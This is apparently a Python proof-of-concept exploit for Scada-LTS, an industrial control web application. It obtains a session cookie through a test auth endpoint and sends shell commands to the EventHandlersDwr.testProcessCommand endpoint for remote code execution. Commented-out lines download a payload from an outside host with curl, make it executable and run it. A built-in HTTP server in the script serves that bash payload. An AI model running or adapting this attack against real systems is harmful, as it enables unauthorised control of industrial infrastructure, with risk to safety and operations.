from http.server import SimpleHTTPRequestHandler, HTTPServer
import requests
import urllib.parse
scada_url='http://10.0.0.21:8080'

hostName = "0.0.0.0"
serverPort = 8080
class MyServer(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes("#!/bin/bash\necho test1 > /root/test.txt", "utf-8"))

def execute_cmd(cmd):
    res = requests.get(scada_url+'/ScadaLTS/api/auth/test/test')
    jsession_cookie=res.headers['Set-Cookie']

    headers = {'Cookie': jsession_cookie,
    'Content-Type': 'text/plain'}

    cmd = urllib.parse.quote_plus(cmd)

    res = requests.post(scada_url+'/ScadaLTS/dwr/call/plaincall/EventHandlersDwr.testProcessCommand.dwr', 
    headers=headers,
    data=f"callCount=1&scriptSessionId=&c0-scriptName=EventHandlersDwr&c0-methodName=testProcessCommand&c0-param0={cmd}")

if __name__ == "__main__":
    ### RCE
    #execute_cmd("test:curl 10.0.0.1:8080 -o /root/cmd")
    #execute_cmd("test:chmod 777 /root/cmd")
    #execute_cmd("test:/root/cmd")
    
    ### WEBSERVER
    webServer = HTTPServer((hostName, serverPort), MyServer)
    print("Server started http://%s:%s" % (hostName, serverPort))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopped.")